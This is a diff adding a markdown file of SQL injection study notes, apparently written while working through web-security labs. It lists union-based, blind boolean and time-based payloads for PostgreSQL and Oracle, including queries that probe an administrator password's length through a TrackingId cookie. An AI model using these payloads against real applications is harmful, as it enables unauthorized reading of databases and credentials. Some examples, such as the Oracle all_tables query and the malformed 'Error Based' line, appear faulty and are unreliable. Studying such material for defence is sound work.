@@ -1,0 +1,68 @@
+### SQLi
+
+SQL Injection (SQLi) Notes
+
+Introduction to SQL Injection
+SQL Injection (SQLi) is a code injection technique used to manipulate or exploit SQL queries by inserting malicious SQL statements. This can lead to unauthorized access to database information, modification of data, and other security breaches.
+
+Key Concepts and Commands
+
+Union-Based SQL Injection
+• Purpose: Used to combine the results from two SELECT queries into a single result set.
+• Syntax: ' UNION SELECT column1, column2 FROM table1 WHERE condition1='value' --+
+• Example: Retrieving information from different tables or columns by leveraging the UNION operator.
+
+
+PostgreSQL Specific Commands
+◇ Retrieve Database Version: ' UNION SELECT version(), NULL--+▪ Retrieves the current version of the PostgreSQL database.
+
+
+◇ List All Table Names: ' UNION SELECT table_name, 'null' FROM information_schema.tables--+▪ Enumerates all table names in the current database schema.
+
+
+◇ List All Column Names: ' UNION SELECT column_name, 'null' FROM information_schema.columns WHERE table_name = 'table_name'--+▪ Enumerates all column names for a specific table in the database.
+
+
+
+
+Blind SQL Injection
+◇ Purpose: Used when the database does not return data to the user or when the results are not visible.
+◇ Example Error Based: TrackingId=xyz' AND SELECT( 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a'--▪ This command checks if the length of the administrator's password is greater than 3.
+
+
+
+
+Oracle Specific Commands
+◇ List Tables and Columns: ' UNION SELECT table_name, column_name FROM all_tables--+▪ Lists all tables and their respective columns in an Oracle database.
+
+
+◇ Blind SQLi Example: TrackingId=xyz'||(SELECT '' FROM dual)||'▪ This is a test to confirm SQL injection by attempting to execute a benign subquery.
+
+
+
+
+Blind SQL Conditional Responses
+◇ Purpose: To deduce information from the database based on the application's response to crafted SQL queries.
+◇ Examples:▪ Test for a valid condition: TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+▪ Determine the length of a password: TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>3)='a
+
+
+
+
+Methodology for SQL Injection
+1. Identify the Injection Point: Determine where in the application's input fields the SQL injection can occur.
+2. Construct the Injection Query: Start with a simple string and progressively build more complex queries.
+3. Test the Query: Verify that the constructed SQL query executes and manipulates the database output or behavior.
+
+Time-Based SQL Injection
+◇ Purpose: A technique where the response time of the query is used to infer database information.
+◇ Example: '|| (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END) --+▪ This query causes the database to delay the response, which can indicate a successful injection.
+
+
+
+By understanding and utilizing these commands and concepts, individuals can identify and prevent SQL injection vulnerabilities in applications, enhancing their security posture.
+
+
+
+
+
